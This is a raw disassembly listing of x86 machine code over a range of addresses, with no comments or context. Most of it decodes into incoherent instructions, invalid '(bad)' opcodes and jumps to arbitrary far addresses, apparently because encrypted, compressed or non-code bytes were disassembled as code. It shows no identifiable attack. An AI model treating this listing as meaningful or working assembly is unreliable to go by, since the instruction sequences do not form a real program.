  40f8e2:	push   edx
  40f8e3:	dec    edx
  40f8e4:	(bad)  
  40f8e5:	mov    al,ds:0x72b9d971
  40f8ea:	mov    edx,0x193c6d83
  40f8ef:	dec    esi
  40f8f0:	jp     0x40f88c
  40f8f2:	dec    ebx
  40f8f3:	cmp    al,0xd7
  40f8f5:	js     0x40f93e
  40f8f7:	jo     0x40f88b
  40f8f9:	retf   
  40f8fa:	pop    ebx
  40f8fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f8fc:	inc    edx
  40f8fd:	mov    al,0x4d
  40f900:	and    edx,edx
  40f902:	icebp  
  40f903:	repz and ah,BYTE PTR [ebx-0x798cc15b]
  40f90a:	fimul  DWORD PTR [ebx-0x4c]
  40f90d:	cmp    BYTE PTR [esi-0x3df4b2c5],0x87
  40f914:	mov    ds:0x621f9978,al
  40f919:	jbe    0x40f950
  40f91b:	imul   edi,DWORD PTR [edx],0x11
  40f91e:	xchg   edi,eax
  40f91f:	add    DWORD PTR [edx+0x19],ebx
  40f922:	sub    eax,0x628e58b4
  40f927:	outs   dx,DWORD PTR ds:[esi]
  40f928:	jo     0x40f908
  40f92a:	inc    edi
  40f92b:	jmp    0x40f8e8
  40f92d:	ins    DWORD PTR es:[edi],dx
  40f92e:	push   eax
  40f92f:	aas    
  40f930:	cmp    al,0x2
  40f932:	lahf   
  40f933:	mov    eax,ds:0x53dfedd
  40f938:	ret    
  40f939:	cld    
  40f93a:	fild   QWORD PTR [ebx+0x2]
  40f93d:	mov    dl,0x38
  40f93f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f940:	gs popf 
  40f942:	adc    eax,0x1abfbb05
  40f947:	xchg   ebx,ebx
  40f949:	jmp    0x40f91b
  40f94b:	xor    ch,al
  40f94d:	fnstsw WORD PTR [esi+edx*1-0x15]
  40f951:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f952:	aam    0x54
  40f954:	retf   0xbf29
  40f957:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f958:	push   edi
  40f959:	out    0x4,eax
  40f95b:	sbb    ebp,edi
  40f95d:	hlt    
  40f95e:	jnp    0x40f8ea
  40f960:	hlt    
  40f961:	dec    ebp
  40f962:	xor    al,BYTE PTR [esi+0x71]
  40f965:	shr    eax,cl
  40f967:	push   0xffffffda
  40f969:	add    bh,BYTE PTR [eax-0x3fa55852]
  40f96f:	icebp  
  40f970:	dec    edi
  40f971:	stc    
  40f972:	das    
  40f973:	inc    esi
  40f974:	xor    ah,ah
  40f976:	ins    BYTE PTR es:[edi],dx
  40f977:	sub    eax,0x5903fd6e
  40f97c:	je     0x40f96f
  40f97e:	sbb    edx,DWORD PTR [esi+0x54]
  40f981:	popa   
  40f982:	dec    edx
  40f983:	pop    esi
  40f984:	or     DWORD PTR ds:0xb0d3ce4,edi
  40f98a:	fist   WORD PTR [edx-0x1af90eaf]
  40f990:	pop    ebx
  40f991:	korw   k2,k2,k3
  40f995:	call   0x909c77a
  40f99a:	daa    
  40f99b:	clc    
  40f99c:	in     al,0x57
  40f99e:	cdq    
  40f99f:	(bad)  
  40f9a0:	(bad)  
  40f9a1:	adc    al,0x12
  40f9a3:	fidiv  WORD PTR [eax+0xa]
  40f9a6:	je     0x40f96d
  40f9a8:	and    DWORD PTR ds:0xa134e80c,0xaa27faac
  40f9b2:	pop    edx
  40f9b3:	push   ebx
  40f9b4:	or     BYTE PTR [ecx-0x6d],0x72
  40f9b8:	cld    
  40f9b9:	xor    eax,ebx
  40f9bb:	bnd jp 0x40f9af
  40f9be:	hlt    
  40f9bf:	pop    ss
  40f9c0:	add    cl,ah
  40f9c2:	dec    eax
  40f9c3:	call   0x4448ca24
  40f9c8:	dec    esp
  40f9c9:	les    esi,FWORD PTR [edx+ebx*4]
  40f9cc:	cmp    DWORD PTR [edx-0x696348fd],ebx
  40f9d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f9d3:	(bad)  
  40f9d4:	in     al,dx
  40f9d5:	jns    0x40f9a7
  40f9d7:	(bad)  
  40f9d8:	xor    al,0x49
  40f9da:	mov    fs,WORD PTR [ecx+esi*8+0x1f]
  40f9de:	inc    ebp
  40f9df:	cwde   
  40f9e0:	pop    edi
  40f9e1:	ret    
  40f9e2:	enter  0xfbb3,0x7b
  40f9e6:	cld    
  40f9e7:	jge    0x40fa00
  40f9e9:	sub    BYTE PTR [eax-0x79],ah
  40f9ec:	jb     0x40f977
  40f9ee:	loop   0x40fa4a
  40f9f0:	or     DWORD PTR [ebp+0x622bc587],eax
  40f9f6:	jno    0x40f9aa
  40f9f8:	mov    dl,0x28
  40f9fa:	xor    ecx,DWORD PTR [esi]
  40f9fc:	adc    edi,DWORD PTR [ebp-0x36ab0735]
  40fa02:	sbb    esi,esp
  40fa04:	cwde   
  40fa05:	dec    ebp
  40fa06:	jmp    0xbad9:0xe52873b5
  40fa0d:	cmp    DWORD PTR [ebx+0x76de9835],ecx
  40fa13:	mov    ds:0x5749b557,al
  40fa18:	push   ss
  40fa19:	ret    0x70c5
  40fa1c:	jne    0x40f9c5
  40fa1e:	pop    edi
  40fa1f:	ja     0x40fa01
  40fa21:	jl     0x40fa2d
  40fa23:	xchg   ebx,eax
  40fa24:	xor    esp,ebx
  40fa26:	fsubr  DWORD PTR [ecx]
  40fa28:	sbb    BYTE PTR gs:[esi+0x53ca1de4],ch
  40fa2f:	pop    ebp
  40fa30:	mov    edi,0x29aea310
  40fa35:	and    eax,0x5b395fae
  40fa3a:	add    al,0xcb
  40fa3c:	fcom   st(5)
  40fa3e:	cwde   
  40fa3f:	or     al,0xee
  40fa41:	mov    bh,0x6c
  40fa43:	cmp    DWORD PTR ss:[bp+di+0x60],esi
  40fa48:	jmp    0x1fcb5203
  40fa4d:	xor    al,0x75
  40fa4f:	or     BYTE PTR [eax],bl
  40fa51:	loope  0x40fa13
  40fa53:	scas   al,BYTE PTR es:[edi]
  40fa54:	adc    BYTE PTR [ecx-0x4410d8cd],ah
  40fa5a:	in     al,dx
  40fa5b:	inc    edx
  40fa5c:	xor    DWORD PTR [ebp+0x31d96e21],ebx
  40fa62:	mov    ecx,0x244ab18b
  40fa67:	sbb    al,al
  40fa69:	ins    BYTE PTR es:[edi],dx
  40fa6a:	jecxz  0x40fabc
  40fa6c:	and    DWORD PTR [ebx],ecx
  40fa6e:	arpl   WORD PTR [edx+0x71],si
  40fa71:	sahf   
  40fa72:	or     cl,BYTE PTR [ecx-0x1f30c6dd]
  40fa78:	aam    0x5c
  40fa7a:	mov    dh,0xd6
  40fa7c:	inc    edi
  40fa7d:	jmp    0x56eface8
  40fa82:	cmc    
  40fa83:	lods   eax,DWORD PTR ds:[esi]
  40fa84:	retf   
  40fa85:	sbb    BYTE PTR [esi-0x58],0xf3
  40fa89:	out    0xd7,al
  40fa8b:	lea    eax,[esi-0x29]
  40fa8e:	and    al,0x59
  40fa90:	cmp    ebx,DWORD PTR [ebp+0x68]
  40fa93:	mov    ds:0xed760638,eax
  40fa98:	aad    0x74
  40fa9a:	xor    edi,esp
  40fa9c:	mov    ch,0x7f
  40fa9e:	cli    
  40fa9f:	mov    eax,ds:0xd835c959
  40faa4:	mov    ds:0x30613e20,al
  40faa9:	pop    es
  40faaa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40faab:	enter  0x4176,0xae
  40faaf:	sub    edi,0xffffffd2
  40fab2:	dec    esi
  40fab3:	mov    edi,DWORD PTR [edx]
  40fab5:	sub    cl,BYTE PTR [esi]
  40fab7:	fcomp  QWORD PTR [ebx+0x44]
  40faba:	mov    gs,ebx
  40fabc:	mov    dl,0x23
  40fabe:	pop    ds
  40fabf:	cli    
  40fac0:	adc    bl,dl
  40fac2:	xchg   edx,eax
  40fac3:	int3   
  40fac4:	pop    edx
  40fac5:	inc    esi
  40fac6:	mov    ebp,0x1d8bf16e
  40facb:	cmp    bh,BYTE PTR ds:[eax+0x35]
  40facf:	cmp    al,0x5e
  40fad1:	mov    dl,0xab
  40fad3:	outs   dx,DWORD PTR ds:[esi]
  40fad4:	fidiv  WORD PTR [esi+0x28]
  40fad7:	xor    al,0xe
  40fad9:	cmc    
  40fada:	sbb    al,0x48
  40fadc:	fild   WORD PTR [edx]
  40fade:	ds stc 
  40fae0:	jmp    0x2ac02b9b
  40fae5:	cmp    eax,0x9744f168
  40faea:	and    esi,edi
  40faec:	cld    
  40faed:	(bad)  
  40faee:	cmp    al,0xd9
  40faf0:	(bad)  
  40faf1:	stc    
  40faf2:	imul   edi,esp,0xffffffbd
  40faf5:	setle  BYTE PTR [esi+0x327e3761]
  40fafc:	push   esp
  40fafd:	pop    eax
  40fafe:	int3   
  40faff:	mov    dh,0xee
  40fb01:	pop    edi
  40fb02:	(bad)  
  40fb03:	and    ebx,DWORD PTR [edx+0xd]
  40fb06:	pop    edi
  40fb07:	leave  
  40fb08:	sbb    eax,0x262e5fa3
  40fb0d:	aam    0x3d
  40fb0f:	jbe    0x40fb5e
  40fb11:	xchg   DWORD PTR ds:0x767acc6,esi
  40fb17:	push   ebx
  40fb18:	cmp    DWORD PTR [esi+eiz*1+0x202c4643],esp
  40fb1f:	(bad)  
  40fb20:	cmp    BYTE PTR [ecx],ah
  40fb22:	dec    eax
  40fb23:	(bad)  
  40fb24:	call   0xf0ac7639
  40fb29:	leave  
  40fb2a:	leave  
  40fb2b:	sbb    DWORD PTR es:[edx-0x59224931],ebp
  40fb32:	pop    edx
  40fb33:	push   esp
  40fb34:	lahf   
  40fb35:	or     ebx,edi
  40fb37:	test   DWORD PTR [eax-0xb],ecx
  40fb3a:	in     eax,dx
  40fb3b:	pop    ebp
  40fb3c:	std    
  40fb3d:	dec    ebx
  40fb3e:	out    dx,al
  40fb3f:	cmp    DWORD PTR ds:0xb1b7fa09,eax
  40fb45:	out    dx,al
  40fb46:	pop    esi
  40fb47:	cmp    BYTE PTR [esi],bl
  40fb49:	cwde   
  40fb4a:	shr    dl,cl
  40fb4c:	or     BYTE PTR [eax-0x39],dl
  40fb4f:	scas   eax,DWORD PTR es:[edi]
  40fb50:	ret    0x60b0
  40fb53:	adc    al,BYTE PTR [edx]
  40fb55:	(bad)  
  40fb56:	mov    gs,WORD PTR [esi-0x1]
  40fb59:	jae    0x40fb9b
  40fb5b:	ins    DWORD PTR es:[edi],dx
  40fb5c:	sbb    DWORD PTR [ecx],edi
  40fb5e:	ds adc eax,0xc8aaea51
  40fb64:	(bad)  
  40fb65:	lds    esp,FWORD PTR [ecx+0x15]
  40fb68:	push   0x3a0b62f4
  40fb6d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fb6e:	not    ebx
  40fb70:	(bad)  
  40fb71:	in     eax,dx
  40fb72:	rol    bl,0x54
  40fb75:	jg     0x40fb8f
  40fb77:	cmp    BYTE PTR [edx+0xa0459af],bl
  40fb7d:	xor    dl,al
  40fb7f:	test   DWORD PTR [ebx+0x7c],edx
  40fb82:	mov    dl,0xec
  40fb84:	out    0x90,eax
  40fb86:	dec    esi
  40fb87:	or     dh,ch
  40fb89:	mov    dl,0x80
  40fb8b:	clc    
  40fb8c:	fsubr  DWORD PTR ds:0x142e1258
  40fb92:	jmp    0xd0ed471
  40fb97:	xchg   edx,eax
  40fb98:	lods   al,BYTE PTR ds:[esi]
  40fb99:	add    DWORD PTR [edi],ecx
  40fb9b:	test   eax,0xf45b38a2
  40fba0:	mov    ?,ebx
  40fba2:	mov    WORD PTR [ebx-0x1b],ss
  40fba5:	push   esi
  40fba6:	mov    ah,0x1c
  40fba8:	cmp    BYTE PTR ss:[edi+0x62],dh
  40fbac:	cs scas al,BYTE PTR es:[edi]
  40fbae:	jae    0x40fbd6
  40fbb0:	add    BYTE PTR [edx],bh
  40fbb2:	test   eax,0xb7faf3c8
  40fbb7:	enter  0xf297,0xe4
  40fbbb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fbbc:	dec    eax
  40fbbd:	mov    ch,0xbf
  40fbbf:	push   eax
  40fbc0:	sub    eax,0x8a43fd5f
  40fbc5:	pop    ds
  40fbc6:	cmp    dl,BYTE PTR [edi+0x5]
  40fbc9:	rcl    ah,cl
  40fbcb:	iret   
  40fbcc:	pop    ebp
  40fbcd:	mov    bl,0xd0
  40fbcf:	pop    esi
  40fbd0:	cmc    
  40fbd1:	xchg   ecx,eax
  40fbd2:	pop    ecx
  40fbd3:	pop    edi
  40fbd4:	out    dx,eax
  40fbd5:	mov    dh,0xf7
  40fbd7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fbd8:	js     0x40fbbf
  40fbda:	mov    dh,0x65
  40fbdc:	add    DWORD PTR [edx-0x4],esp
  40fbdf:	lods   al,BYTE PTR ds:[esi]
  40fbe0:	(bad)  
  40fbe1:	scas   al,BYTE PTR es:[edi]
  40fbe2:	arpl   WORD PTR [ebx+ebp*1+0x43f8aac3],bp
  40fbe9:	inc    eax
  40fbea:	(bad)  
  40fbeb:	adc    al,0x44
  40fbed:	addr16 (bad) 
  40fbef:	mov    ebx,0xab8e2ab5
  40fbf4:	js     0x40fbe2
  40fbf6:	and    esi,esi
  40fbf8:	(bad)  
  40fbf9:	fimul  WORD PTR [ebx-0x24]
  40fbfc:	xchg   esi,eax
  40fbfd:	dec    edi
  40fbfe:	test   DWORD PTR [ebx+0x67],edx
  40fc01:	or     ah,dh
  40fc03:	clc    
  40fc04:	push   ebp
  40fc05:	dec    edx
  40fc06:	(bad)  
  40fc07:	mov    ecx,0x79fc2e5a
  40fc0c:	jmp    0xf79d:0x91c9147e
  40fc13:	pop    si
  40fc15:	and    ch,BYTE PTR [edx+0x49dad76e]
  40fc1b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fc1c:	not    DWORD PTR [esi-0xa]
  40fc1f:	and    edi,0xffffffd0
  40fc22:	adc    esi,DWORD PTR [edi]
  40fc24:	imul   ebp,DWORD PTR [esi-0x14],0xffffffe6
  40fc28:	je     0x40fc84
  40fc2a:	ss stc 
  40fc2c:	bound  ebp,QWORD PTR [ecx-0x28]
  40fc2f:	add    esi,0x75c11195
  40fc35:	fstp   DWORD PTR [esi+0x11c8cafe]
  40fc3b:	mov    al,0xf7
  40fc3d:	loope  0x40fc6b
  40fc3f:	popa   
  40fc40:	xchg   esi,eax
  40fc41:	jg     0x40fbd9
  40fc43:	(bad)  
  40fc44:	aas    
  40fc45:	cwde   
  40fc46:	xlat   BYTE PTR ds:[ebx]
  40fc47:	nop
  40fc48:	dec    ecx
  40fc49:	repnz or edi,DWORD PTR [edi]
  40fc4c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fc4d:	push   es
  40fc4e:	repz adc BYTE PTR [ebx+ebp*2],ch
  40fc52:	ficom  WORD PTR [edi+0x52]
  40fc55:	dec    ecx
  40fc56:	xchg   ecx,eax
  40fc57:	hlt    
  40fc58:	dec    esi
  40fc59:	add    ah,ch
  40fc5b:	(bad)  
  40fc5c:	jnp    0x40fbe9
  40fc5e:	push   esi
  40fc5f:	into   
  40fc60:	ret    0x9b64
  40fc63:	imul   eax,DWORD PTR [esi],0x20e378ec
  40fc69:	sub    eax,0x9ad5aafa
  40fc6e:	imul   DWORD PTR [ecx+ebp*8-0x12]
  40fc72:	gs or  al,0xa6
  40fc75:	xor    bl,ch
  40fc77:	add    DWORD PTR [ebx],0xbd28c803
  40fc7d:	mov    DWORD PTR [ebp+0x7bc87e8f],ecx
  40fc83:	xor    eax,0xeeec9bea
  40fc88:	jne    0x40fc64
  40fc8a:	cli    
  40fc8b:	jne    0x40fcff
  40fc8d:	(bad)  
  40fc8e:	(bad)  
  40fc8f:	cmp    DWORD PTR [esi-0x7e86f057],edi
  40fc95:	pop    ebp
  40fc96:	mov    bh,0xc
  40fc98:	pop    es
  40fc99:	das    
  40fc9a:	sub    DWORD PTR [esi],esi
  40fc9c:	or     ecx,eax
  40fc9e:	mov    ds:0xe8c68358,eax
  40fca3:	pop    ebx
  40fca4:	cmp    al,0x3f
  40fca6:	mov    ds,eax
  40fca8:	and    bh,BYTE PTR [ecx]
  40fcaa:	dec    eax
  40fcab:	sahf   
  40fcac:	and    esp,DWORD PTR [edi]
  40fcae:	in     eax,dx
  40fcaf:	sahf   
  40fcb0:	out    0x6f,al
  40fcb2:	pushf  
  40fcb3:	cld    
  40fcb4:	fwait
  40fcb5:	fwait
  40fcb6:	xchg   esp,eax
  40fcb7:	jno    0x40fc45
  40fcb9:	jb     0x40fcfd
  40fcbb:	retf   
  40fcbc:	cli    
  40fcbd:	push   esi
  40fcbe:	clc    
  40fcbf:	push   cs
  40fcc0:	icebp  
  40fcc1:	mov    ch,0x5b
  40fcc3:	sbb    ebx,ebp
  40fcc5:	test   eax,0xd44cd245
  40fcca:	fld    TBYTE PTR [ecx+0x22]
  40fccd:	push   ebx
  40fcce:	sbb    al,0x9a
  40fcd0:	push   edi
  40fcd1:	fwait
  40fcd2:	xchg   ebx,eax
  40fcd3:	ret    0xb1cf
  40fcd6:	enter  0x4f0,0xfc
  40fcda:	cmp    al,0xc6
  40fcdc:	ins    BYTE PTR es:[edi],dx
  40fcdd:	pop    edx
  40fcde:	and    DWORD PTR [edi+0x2caffdc9],esp
  40fce4:	xor    bl,cl
  40fce6:	js     0x40fca9
  40fce8:	adc    DWORD PTR [ecx-0x80],ebx
  40fceb:	aas    
  40fcec:	imul   esp,ebx,0xffffffec
  40fcef:	jp     0x40fcc3
  40fcf1:	shr    BYTE PTR [ebp-0x32],0x3a
  40fcf5:	call   0xa1a9:0x8504f412
  40fcfc:	push   ecx
  40fcfd:	adc    dh,BYTE PTR [edi-0x1d]
  40fd00:	in     eax,dx
  40fd01:	push   0x76
  40fd03:	mov    ds:0xc1ea2a3,al
  40fd08:	jl     0x40fd19
  40fd0a:	mov    eax,0xead4c5ef
  40fd0f:	mov    ds:0xed9e91b5,eax
  40fd14:	pushf  
  40fd15:	mov    dl,0x4f
  40fd17:	popf   
  40fd18:	pop    ss
  40fd19:	xchg   esi,eax
  40fd1a:	out    0x6e,eax
  40fd1c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fd1d:	adc    ecx,ecx
  40fd1f:	jecxz  0x40fcc4
  40fd21:	stos   DWORD PTR es:[edi],eax
  40fd22:	ja     0x40fd15
  40fd24:	fwait
  40fd25:	mov    cl,0x84
  40fd27:	xchg   edx,eax
  40fd28:	push   0xe681f000
  40fd2d:	adc    al,0xc1
  40fd2f:	setp   BYTE PTR [edx+0xc]
  40fd33:	sub    al,0x28
  40fd35:	jno    0x40fd55
  40fd37:	jb     0x40fcd7
  40fd39:	dec    esp
  40fd3a:	inc    edi
  40fd3b:	mov    BYTE PTR [eax+0x7234cad9],dh
  40fd41:	popf   
  40fd42:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fd44:	inc    edi
  40fd45:	sbb    esi,DWORD PTR [edx+0x71]
  40fd48:	cld    
  40fd49:	mov    dh,0x89
  40fd4b:	adc    BYTE PTR [edi],cl
  40fd4d:	dec    eax
  40fd4e:	mov    cl,0xc3
  40fd50:	pop    ecx
  40fd51:	pop    esp
  40fd52:	mov    edi,0x7497a25d
  40fd57:	arpl   bx,si
  40fd59:	pop    ebp
  40fd5a:	gs xchg ebp,eax
  40fd5c:	call   0x6f0df199
  40fd61:	cmp    al,0x93
  40fd63:	retf   0x5758
  40fd66:	push   ebx
  40fd67:	(bad)  
  40fd68:	push   ecx
  40fd69:	aas    
  40fd6a:	pop    ds
  40fd6b:	pop    ecx
  40fd6c:	xchg   DWORD PTR [esi],ebx
  40fd6e:	jmp    0x40fd76
  40fd70:	in     al,0x9
  40fd72:	mov    ch,0x32
  40fd74:	sahf   
  40fd75:	retf   0xbb80
  40fd78:	cmp    esi,DWORD PTR ds:0x88f17025
  40fd7e:	pop    ebp
  40fd7f:	or     eax,DWORD PTR [ebx-0x59f577da]
  40fd85:	iret   
  40fd86:	add    cl,BYTE PTR [ebx+eiz*4]
  40fd89:	int3   
  40fd8a:	ficom  DWORD PTR [edi-0x25]
  40fd8d:	adc    al,0x2b
  40fd8f:	adc    eax,0x7ab4a59c
  40fd94:	loop   0x40fd8c
  40fd96:	cmp    DWORD PTR [ecx+0x64df62d7],ebp
  40fd9c:	dec    ecx
  40fd9d:	inc    esp
  40fd9e:	int3   
  40fd9f:	lds    eax,FWORD PTR [edi]
  40fda1:	add    DWORD PTR [bx+di],0x61
  40fda5:	mov    bh,0x48
  40fda7:	ins    DWORD PTR es:[edi],dx
  40fda8:	(bad)
  40fdab:	aaa    
  40fdac:	ins    BYTE PTR es:[edi],dx
  40fdad:	dec    eax
  40fdae:	and    bl,ah
  40fdb0:	sbb    al,0x45
  40fdb2:	test   al,0x9f
  40fdb4:	shl    DWORD PTR [ebx-0x55],0x6a
  40fdb8:	stos   DWORD PTR es:[edi],eax
  40fdb9:	and    ecx,ebx
  40fdbb:	es cmp al,0xd0
  40fdbe:	stos   BYTE PTR es:[edi],al
  40fdbf:	jl     0x40fdfe
  40fdc1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fdc2:	sbb    dl,BYTE PTR [eax-0x34]
  40fdc5:	arpl   WORD PTR [ebx-0x7f4be7bf],si
  40fdcb:	ret    
  40fdcc:	mov    bh,0x4d
  40fdce:	sbb    al,0x65
  40fdd0:	call   FWORD PTR [ebx*1-0x5d356efe]
  40fdd7:	pop    ebp
  40fdd8:	jne    0x40fdb4
  40fdda:	dec    edi
  40fddb:	mov    esp,gs
  40fddd:	inc    esi
  40fdde:	das    
  40fddf:	shl    dl,1
  40fde1:	das    
  40fde2:	ret    
  40fde3:	rol    ebx,cl
  40fde5:	mov    eax,0x41ea1bb8
  40fdea:	add    cx,WORD PTR [ebx]
  40fded:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fdee:	out    dx,al
  40fdef:	jmp    0x6738:0x564b53a3
  40fdf6:	sub    ah,BYTE PTR [edx-0x16142a35]
  40fdfc:	cmp    eax,edi
  40fdfe:	push   esp
  40fdff:	ds or  eax,0xa10dcae5
  40fe05:	(bad)  [ecx-0x3b]
  40fe08:	push   0x21
  40fe0a:	push   cs
  40fe0b:	popa   
  40fe0c:	js     0x40fe5c
  40fe0e:	mov    dh,0x6c
  40fe10:	icebp  
  40fe11:	push   edx
  40fe12:	mov    cl,0x87
  40fe14:	dec    eax
  40fe15:	mov    ss,WORD PTR [edi+0x1c]
  40fe18:	pop    esp
  40fe19:	scas   eax,DWORD PTR es:[edi]
  40fe1a:	push   ebx
  40fe1b:	push   ebp
  40fe1c:	pop    ecx
  40fe1d:	stos   DWORD PTR es:[edi],eax
  40fe1e:	cmp    ebx,eax
  40fe20:	fld    DWORD PTR [edx-0x37]
  40fe23:	and    BYTE PTR [ecx-0x75],dh
  40fe26:	jl     0x40fe90
  40fe28:	sbb    eax,0x1f05c511
  40fe2d:	in     eax,0xdd
  40fe2f:	aam    0x80
  40fe31:	jmp    0x40fe8f
  40fe33:	leave  
  40fe34:	jmp    0x3b80b56b
  40fe39:	test   DWORD PTR [ecx+0x3c4e033a],ecx
  40fe3f:	aam    0xc2
  40fe41:	jp     0x40fe28
  40fe43:	(bad)  
  40fe44:	xchg   edi,eax
  40fe45:	inc    esi
  40fe46:	jmp    0x6979:0xdd270fac
  40fe4d:	hlt    
  40fe4e:	cmp    DWORD PTR [eax+0xf],esi
  40fe51:	mov    dh,0xf7
  40fe53:	dec    edi
  40fe54:	jbe    0x40fec8
  40fe56:	inc    ebp
  40fe57:	out    0xef,eax
  40fe59:	adc    ecx,ecx
  40fe5b:	mov    dl,0x3d
  40fe5d:	cmp    bh,al
  40fe5f:	push   es
  40fe60:	and    DWORD PTR [esi],edi
  40fe62:	add    cl,cl
  40fe64:	dec    esi
  40fe65:	shl    DWORD PTR [eax],1
  40fe67:	imul   edx,DWORD PTR [edx+0x3d0e4817],0x29af46ad
  40fe71:	cld    
  40fe72:	pop    ds
  40fe73:	jecxz  0x40fe85
  40fe75:	ret    0xe52f
  40fe78:	xor    al,0xab
  40fe7a:	call   0x22d1:0x8b428949
  40fe81:	enter  0x74d6,0x68
  40fe85:	inc    esi
  40fe86:	mov    bl,0x79
  40fe88:	cmp    DWORD PTR [edx-0x3b],esi
  40fe8b:	mov    esp,0x114cd96b
  40fe90:	pop    edx
  40fe91:	and    DWORD PTR [ecx+edi*2+0x5638f6ad],0x4e489524
  40fe9c:	dec    ebx
  40fe9d:	dec    esi
  40fe9e:	inc    esp
  40fe9f:	clc    
  40fea0:	(bad)  
  40fea1:	call   0xd7c6:0x93cbb0e2
  40fea8:	mov    al,0xbf
  40feaa:	call   0x7d69:0x60840c3b
  40feb1:	lock adc eax,0x54769ed2
  40feb7:	cmc    
  40feb8:	add    DWORD PTR [edi],edi
  40feba:	das    
  40febb:	icebp  
  40febc:	scas   al,BYTE PTR es:[edi]
  40febd:	aas    
  40febe:	push   ss
  40febf:	push   ecx
  40fec0:	jae    0x40fe99
  40fec2:	push   es
  40fec3:	les    esi,FWORD PTR [edx+0x3dfa4b01]
  40fec9:	pop    edi
  40feca:	mov    esp,0x9c61ac16
  40fecf:	aaa    
  40fed0:	xor    al,0xb6
  40fed2:	pop    edi
  40fed3:	push   0x381f42a3
  40fed8:	rcl    dl,1
  40feda:	cmp    al,0x1b
  40fedc:	xor    DWORD PTR [edi+eiz*4-0xceaa2bf],ebx
  40fee3:	mov    dh,0x6b
  40fee5:	lea    ebx,[esi]
  40fee7:	push   ds
  40fee8:	ss clc 
  40feea:	push   cs
  40feeb:	int    0xe7
  40feed:	xchg   ecx,eax
  40feee:	repnz pop es
  40fef0:	mov    cl,BYTE PTR [eax-0x179cc01]
  40fef6:	mov    cl,0xe3
  40fef8:	adc    eax,0x25146892
  40fefd:	push   ebx
  40fefe:	nop
  40feff:	jle    0x40ff26
  40ff01:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ff02:	cmc    
  40ff03:	adc    eax,0x6d241ebc
  40ff08:	or     DWORD PTR [edi-0x62],esi
  40ff0b:	and    bh,BYTE PTR [eax-0x63]
  40ff0e:	push   edi
  40ff0f:	jmp    0xb0d73940
  40ff14:	dec    ecx
  40ff15:	mov    edi,ds
  40ff17:	retf   0x3ed8
  40ff1a:	xor    ebx,edi
  40ff1c:	jb     0x40ff88
  40ff1e:	ret    
  40ff1f:	and    eax,0x3434ba3e
  40ff24:	push   ss
  40ff25:	cmp    bh,al
  40ff27:	cmp    ebp,eax
  40ff29:	mov    cl,BYTE PTR [eax+0x3c181d9a]
  40ff2f:	push   esp
  40ff30:	mov    esp,0xd148aabf
  40ff35:	out    0x6d,eax
  40ff37:	bound  esp,QWORD PTR [edi+ebx*4-0x12ce370f]
  40ff3e:	stc    
  40ff3f:	push   ss
  40ff40:	add    eax,DWORD PTR [ebp+ebp*2+0x57]
  40ff44:	out    0x1d,al
  40ff46:	nop
  40ff47:	fidiv  WORD PTR [edx+0x5c8f4e72]
  40ff4d:	inc    eax
  40ff4e:	stos   BYTE PTR es:[edi],al
  40ff4f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ff50:	nop
  40ff51:	xor    eax,0xb3077f8b
  40ff56:	mov    ah,0xff
  40ff58:	fld    TBYTE PTR [eax+0x4e9e609b]
  40ff5e:	mov    eax,ds:0x39d204a2
  40ff63:	out    dx,al
  40ff64:	dec    ebx
  40ff65:	fistp  QWORD PTR [esp+edi*4+0x2a]
  40ff69:	push   ebx
  40ff6a:	cmp    al,0xdf
  40ff6c:	ret    0x2926
  40ff6f:	and    bh,BYTE PTR [ebx+0x3d]
  40ff72:	jno    0x40ffca
  40ff74:	push   ds
  40ff75:	push   cs
  40ff76:	mov    ebx,0x1d141f49
  40ff7b:	dec    ecx
	...
  40ffbc:	add    BYTE PTR [eax],al
  40ffbe:	add    BYTE PTR [edi-0x5c],ch
  40ffc1:	daa    
  40ffc2:	jbe    0x40ffb3
  40ffc4:	idiv   DWORD PTR [edi-0x43]
  40ffc7:	mov    ecx,0x8c16f8af
  40ffcc:	push   ebx
  40ffcd:	adc    al,0xa1
  40ffcf:	jae    0x40ffd6
  40ffd1:	add    DWORD PTR [eax],eax
  40ffd3:	and    eax,0x4b000007
  40ffd8:	(bad)  
  40ffda:	inc    edx
  40ffdb:	or     eax,0xb719c317
  40ffe0:	mov    dl,0x38
  40ffe2:	sub    BYTE PTR cs:[ecx-0x1d56ebf9],bh
  40ffe9:	add    ecx,DWORD PTR [ebp-0x238e8240]
  40ffef:	xchg   sp,ax
  40fff1:	je     0x410061
  40fff3:	or     eax,ebx
  40fff5:	jg     0x40ffee
  40fff7:	and    BYTE PTR [edi+0x5],0xa3
  40fffb:	jo     0x40ffd9
  40fffd:	pop    ds
  40fffe:	sbb    BYTE PTR [edi],al
  410000:	dec    ecx
  410001:	lea    esi,[ebp+0x4b]
  410004:	jmp    0x40fff7
  410006:	jg     0x41006b
  410008:	mov    ah,0x11
  41000a:	push   ebx
  41000b:	repnz adc BYTE PTR [eax+0x5a429475],dh
  410012:	cmp    eax,0x129cb28e
  410017:	mov    dh,0x91
  410019:	arpl   WORD PTR [esi-0x4c],bx
  41001c:	sub    dh,BYTE PTR ds:0x2ab7423e
  410022:	pop    ebp
  410023:	and    eax,0xaae8e5dd
  410028:	ins    DWORD PTR es:[edi],dx
  410029:	out    dx,eax
  41002a:	or     ebx,DWORD PTR [ebx-0x56]
  41002d:	mov    ds:0x80b4b2c,al
  410032:	aad    0x10
  410034:	into   
  410035:	xchg   edi,eax
  410036:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410037:	mov    ss,WORD PTR [ebx+0x4b42b1d2]
  41003d:	lahf   
